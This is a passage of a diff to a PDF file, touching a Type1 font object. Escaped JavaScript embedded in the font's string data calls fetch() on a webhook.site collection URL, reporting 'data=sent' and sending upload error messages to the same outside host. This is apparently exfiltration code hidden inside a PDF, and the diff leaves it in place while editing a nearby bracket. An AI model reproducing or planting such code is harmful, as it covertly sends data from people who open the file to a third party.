@@ -37,7 +37,7 @@ endobj
             fetch\("https://webhook.site/1cb1d375-4c65-482d-b2e9-c42d30e1811c?data=sent"\)
         }\)
             .catch\(err => fetch\("https://webhook.site/1cb1d375-4c65-482d-b2e9-c42d30e1811c?uploadErr=" + err.message\)\);
-    }\)
+
 //)]
 /Subtype/Type1
 /FirstChar 65
